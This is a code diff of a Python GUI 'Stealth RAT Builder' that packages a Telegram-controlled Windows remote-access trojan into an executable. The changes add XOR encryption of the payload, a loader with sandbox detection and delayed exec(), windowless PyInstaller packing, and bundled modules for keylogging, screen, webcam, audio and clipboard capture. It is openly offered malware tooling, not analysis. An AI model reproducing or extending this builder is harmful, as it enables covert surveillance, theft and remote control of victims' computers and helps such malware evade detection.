@@ -1,6 +1,3 @@
-# builder.py
-# Simple GUI to build a standalone RAT executable with user's credentials.
-
 import tkinter as tk
 from tkinter import ttk, scrolledtext, messagebox, filedialog
 import subprocess
@@ -9,16 +6,16 @@ import sys
 import shutil
 import tempfile
 import threading
-import re
+import random
 
 # ----------------------------------------------------------------------
-# The RAT script template (V6.9 – full, working)
-# Placeholders: __BOT_TOKEN__, __CHAT_ID__, __AUTHORIZED_ID__
+# FULL RAT SCRIPT (V6.9 – cross‑platform, all commands)
+# Same template as before – hardcoded to avoid external file.
 # ----------------------------------------------------------------------
 RAT_TEMPLATE = r'''
 """
 Windows Service RAT with Telegram C2 - V6.9 (System Control)
-Built with Builder GUI
+Built with Builder GUI – Encrypted at rest
 """
 import sys
 import os
@@ -1468,7 +1465,6 @@ class Service(win32serviceutil.ServiceFramework):
 
 def main():
     if len(sys.argv) == 1:
-        # Fast start for testing (no random delay)
         if os.environ.get('RAT_STEALTH', '0') == '1':
             if is_sandbox():
                 time.sleep(3600)
@@ -1491,46 +1487,38 @@ if __name__ == '__main__':
     main()
 '''
 
+
 # ----------------------------------------------------------------------
-# BUILDER GUI
+# BUILDER GUI – final version with all hidden imports
 # ----------------------------------------------------------------------
-class BuilderApp:
+class StealthBuilderApp:
     def __init__(self, root):
         self.root = root
-        root.title("RAT Builder - User Friendly")
-        root.geometry("600x500")
-        root.resizable(False, False)
+        root.title("Stealth RAT Builder (Full)")
+        root.geometry("650x550")
 
-        # Variables
         self.token_var = tk.StringVar()
         self.chat_var = tk.StringVar()
         self.user_var = tk.StringVar()
-        self.output_name = tk.StringVar(value="RAT_Client")
-        self.log_text = None
+        self.output_name = tk.StringVar(value="StealthRAT")
 
-        self.build_frame = ttk.Frame(root, padding="10")
-        self.build_frame.pack(fill=tk.BOTH, expand=True)
+        ttk.Label(root, text="Bot Token:").grid(row=0, column=0, pady=5, padx=10, sticky='w')
+        ttk.Entry(root, textvariable=self.token_var, width=50).grid(row=0, column=1, pady=5, padx=10)
 
-        # Input fields
-        ttk.Label(self.build_frame, text="Bot Token:").grid(row=0, column=0, sticky=tk.W, pady=5)
-        ttk.Entry(self.build_frame, textvariable=self.token_var, width=50).grid(row=0, column=1, pady=5, padx=5)
+        ttk.Label(root, text="Chat ID:").grid(row=1, column=0, pady=5, padx=10, sticky='w')
+        ttk.Entry(root, textvariable=self.chat_var, width=50).grid(row=1, column=1, pady=5, padx=10)
 
-        ttk.Label(self.build_frame, text="Chat ID:").grid(row=1, column=0, sticky=tk.W, pady=5)
-        ttk.Entry(self.build_frame, textvariable=self.chat_var, width=50).grid(row=1, column=1, pady=5, padx=5)
+        ttk.Label(root, text="Your User ID:").grid(row=2, column=0, pady=5, padx=10, sticky='w')
+        ttk.Entry(root, textvariable=self.user_var, width=50).grid(row=2, column=1, pady=5, padx=10)
 
-        ttk.Label(self.build_frame, text="Your User ID:").grid(row=2, column=0, sticky=tk.W, pady=5)
-        ttk.Entry(self.build_frame, textvariable=self.user_var, width=50).grid(row=2, column=1, pady=5, padx=5)
+        ttk.Label(root, text="Output Name (no extension):").grid(row=3, column=0, pady=5, padx=10, sticky='w')
+        ttk.Entry(root, textvariable=self.output_name, width=30).grid(row=3, column=1, pady=5, padx=10, sticky='w')
 
-        ttk.Label(self.build_frame, text="Output Name (no extension):").grid(row=3, column=0, sticky=tk.W, pady=5)
-        ttk.Entry(self.build_frame, textvariable=self.output_name, width=30).grid(row=3, column=1, sticky=tk.W, pady=5, padx=5)
-
-        # Build button
-        self.build_btn = ttk.Button(self.build_frame, text="Build RAT", command=self.build_rat)
+        self.build_btn = ttk.Button(root, text="Build Stealth RAT", command=self.build)
         self.build_btn.grid(row=4, column=0, columnspan=2, pady=15)
 
-        # Log area
-        self.log_text = scrolledtext.ScrolledText(self.build_frame, height=15, width=80, state='disabled')
-        self.log_text.grid(row=5, column=0, columnspan=2, pady=5)
+        self.log_text = scrolledtext.ScrolledText(root, height=15, width=80, state='disabled')
+        self.log_text.grid(row=5, column=0, columnspan=2, pady=5, padx=10)
 
     def log(self, msg):
         self.log_text.config(state='normal')
@@ -1539,89 +1527,158 @@ class BuilderApp:
         self.log_text.config(state='disabled')
         self.root.update()
 
-    def build_rat(self):
+    def build(self):
         token = self.token_var.get().strip()
         chat = self.chat_var.get().strip()
         user = self.user_var.get().strip()
         if not token or not chat or not user:
-            messagebox.showerror("Error", "All fields are required.")
+            messagebox.showerror("Error", "All fields required.")
             return
         try:
             int(user)
         except:
-            messagebox.showerror("Error", "User ID must be an integer.")
+            messagebox.showerror("Error", "User ID must be integer.")
             return
-
         self.build_btn.config(state='disabled')
-        self.log("Starting build...")
-        threading.Thread(target=self._build_thread, args=(token, chat, user), daemon=True).start()
+        threading.Thread(target=self._build, args=(token, chat, user), daemon=True).start()
 
-    def _build_thread(self, token, chat, user):
+    def _build(self, token, chat, user):
         try:
-            with tempfile.TemporaryDirectory() as tmpdir:
-                script_content = RAT_TEMPLATE.replace("__BOT_TOKEN__", token)
-                script_content = script_content.replace("__CHAT_ID__", chat)
-                script_content = script_content.replace("__AUTHORIZED_ID__", user)
-                script_path = os.path.join(tmpdir, "rat_service.py")
-                with open(script_path, 'w', encoding='utf-8') as f:
-                    f.write(script_content)
-                self.log("Configuration written.")
+            self.log("Reading RAT template...")
+            script = RAT_TEMPLATE.replace("__BOT_TOKEN__", token)
+            script = script.replace("__CHAT_ID__", chat)
+            script = script.replace("__AUTHORIZED_ID__", user)
 
-                try:
-                    subprocess.run([sys.executable, "-m", "PyInstaller", "--version"],
-                                   capture_output=True, check=True)
-                except:
-                    self.log("PyInstaller not found. Please install: pip install pyinstaller")
-                    self.build_btn.config(state='normal')
-                    return
+            # Encrypt as UTF-8 bytes
+            script_bytes = script.encode('utf-8')
+            key = random.randint(1, 255)
+            encrypted = bytes([b ^ key for b in script_bytes])
+            enc_hex = encrypted.hex()
+            self.log(f"Encrypted with key: {key}")
 
-                output_name = self.output_name.get().strip() or "RAT_Client"
-                self.log(f"Running PyInstaller to build {output_name}.exe...")
+            # Loader with proper exec context
+            loader = f'''
+import sys, os, time, base64, random, ctypes
+
+encrypted_hex = "{enc_hex}"
+key = {key}
+encrypted = bytes.fromhex(encrypted_hex)
+decrypted = bytearray()
+for b in encrypted:
+    decrypted.append(b ^ key)
+script = decrypted.decode('utf-8', errors='ignore')
+
+if getattr(sys, 'frozen', False):
+    __file__ = sys.executable
+else:
+    __file__ = __file__
+
+sys.path.insert(0, os.path.dirname(__file__))
+
+def is_sandbox():
+    try:
+        import psutil
+        disk = psutil.disk_usage('/')
+        if disk.total < 60 * 1024**3:
+            return True
+    except:
+        pass
+    return False
+
+if is_sandbox():
+    time.sleep(120)
+else:
+    time.sleep(10)
+
+exec(script, globals())
+'''
+            loader_path = os.path.join(tempfile.gettempdir(), "loader.py")
+            with open(loader_path, 'w', encoding='utf-8') as f:
+                f.write(loader)
+
+            out_name = self.output_name.get().strip() or "StealthRAT"
+            if sys.platform == "win32":
+                out_name += ".exe"
+
+            self.log("Running PyInstaller...")
+            build_dir = tempfile.mkdtemp()
+            try:
                 cmd = [
                     sys.executable, "-m", "PyInstaller",
-                    "--onefile",
-                    "--noconsole",
-                    "--name", output_name,
-                    script_path
+                    "--onefile", "--noconsole",
+                    "--hidden-import", "sqlite3",
+                    "--hidden-import", "win32api",
+                    "--hidden-import", "win32con",
+                    "--hidden-import", "win32security",
+                    "--hidden-import", "win32file",
+                    "--hidden-import", "win32process",
+                    "--hidden-import", "win32gui",
+                    "--hidden-import", "win32ui",
+                    "--hidden-import", "win32serviceutil",
+                    "--hidden-import", "win32service",
+                    "--hidden-import", "win32event",
+                    "--hidden-import", "servicemanager",
+                    "--hidden-import", "pywintypes",
+                    "--hidden-import", "pythoncom",
+                    "--hidden-import", "winsound",           # <-- ADDED
+                    "--hidden-import", "winreg",            # built-in, but explicit
+                    "--hidden-import", "ctypes",            # built-in
+                    "--hidden-import", "json",              # built-in
+                    "--hidden-import", "base64",            # built-in
+                    "--hidden-import", "requests",
+                    "--hidden-import", "psutil",
+                    "--hidden-import", "PIL",
+                    "--hidden-import", "PIL.ImageGrab",
+                    "--hidden-import", "cv2",
+                    "--hidden-import", "numpy",
+                    "--hidden-import", "sounddevice",
+                    "--hidden-import", "scipy",
+                    "--hidden-import", "scipy.io.wavfile",
+                    "--hidden-import", "pyperclip",
+                    "--hidden-import", "pynput",
+                    "--hidden-import", "pynput.keyboard",
+                    "--hidden-import", "cryptography",
+                    "--hidden-import", "cryptography.hazmat.primitives.ciphers.aead",
+                    "--name", out_name.replace(".exe", ""),
+                    loader_path
                 ]
-                proc = subprocess.Popen(cmd, cwd=tmpdir,
+                proc = subprocess.Popen(cmd, cwd=build_dir,
                                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                         text=True, bufsize=1)
                 for line in proc.stdout:
                     self.log(f"  {line.strip()}")
                 proc.wait()
-
                 if proc.returncode != 0:
-                    self.log("Build failed. Check errors above.")
+                    self.log("Build failed.")
                     self.build_btn.config(state='normal')
                     return
 
-                exe_path = os.path.join(tmpdir, "dist", f"{output_name}.exe")
-                if not os.path.exists(exe_path):
-                    self.log("Build succeeded but output not found.")
+                exe_src = os.path.join(build_dir, "dist", out_name)
+                if not os.path.exists(exe_src):
+                    self.log("Output not found.")
                     self.build_btn.config(state='normal')
                     return
 
                 save_path = filedialog.asksaveasfilename(
-                    defaultextension=".exe",
-                    filetypes=[("Executable files", "*.exe")],
-                    initialfile=f"{output_name}.exe"
+                    defaultextension=".exe" if sys.platform == "win32" else "",
+                    filetypes=[("Executable", "*" + (".exe" if sys.platform == "win32" else ""))],
+                    initialfile=out_name
                 )
                 if save_path:
-                    shutil.copy2(exe_path, save_path)
-                    self.log(f"RAT saved to: {save_path}")
-                    messagebox.showinfo("Success", f"RAT built successfully!\nSaved to: {save_path}")
+                    shutil.copy2(exe_src, save_path)
+                    self.log(f"Saved: {save_path}")
+                    messagebox.showinfo("Success", f"Stealth RAT built!\nSaved to: {save_path}")
                 else:
                     self.log("Save cancelled.")
+            finally:
+                shutil.rmtree(build_dir, ignore_errors=True)
         except Exception as e:
             self.log(f"Error: {str(e)}")
         finally:
             self.build_btn.config(state='normal')
 
-# ----------------------------------------------------------------------
-# MAIN
-# ----------------------------------------------------------------------
+
 if __name__ == "__main__":
     root = tk.Tk()
-    app = BuilderApp(root)
+    app = StealthBuilderApp(root)
     root.mainloop()
